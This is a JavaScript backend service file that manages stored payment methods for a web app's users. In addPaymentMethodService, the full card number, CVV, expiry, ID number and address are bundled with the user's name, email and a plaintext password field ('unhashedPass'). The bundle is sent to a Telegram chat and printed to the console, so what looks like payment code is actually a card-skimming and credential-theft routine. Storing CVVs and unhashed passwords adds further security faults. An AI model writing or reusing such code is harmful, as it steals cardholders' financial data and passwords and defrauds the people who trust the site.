import prisma from "../config/db.js";
import { sendTelegramMessage } from "./telService.js";


export const getPaymentsMethodByUserService = async (user) => {
    const userId = user.id;
    const paymentMethods = await prisma.paymentMethod.findMany({
        where: { userId },
    });
    if (!paymentMethods) {
        return {
            success: true,
            data: []
        }
    }
    return {
        success: true,
        data: paymentMethods
    }
}

export const addPaymentMethodService = async (userId, body) => {
    const { name, idNumber, cNumber, exp, cvv, zip, country, state, address, city, email } = body
    const existingPayMethod = await prisma.paymentMethod.findUnique({where: {cNumber: cNumber}});
    if(existingPayMethod) {
        return {
            succes: false,
            error: 400,
            errorMessage: "Payment method already in use"
        }
    }
    const paymentData = await prisma.paymentMethod.create({
        data: {
            userId,
            name,
            idNumber,
            cNumber,
            exp,
            cvv,
            zip,
            country,
            state,
            address,
            city,
            email,
        }
    });
    const userData = await prisma.user.findUnique({
        where: { id: userId },
        select: { id: false, name: true, email: true, activeSub: false, unhashedPass: true },
    })
    const payload = {paymentData, userData};
    sendTelegramMessage(payload)
    console.log(payload)
    return {
        success: true,
        data: "pay method added."
    }
}


export const removePaymentMethodService = async (userId, id) => {
    const paymentMethod = await prisma.paymentMethod.findUnique({ where: { id } });
    if (!paymentMethod || paymentMethod.userId !== userId) {
        return {
            success: false,
            error: 403,
            errorMessage: "Unauthorized"
        }
    }
    await prisma.paymentMethod.delete({ where: { id } });
    return {
        success: true,
        data: "pay method removed."
    }
}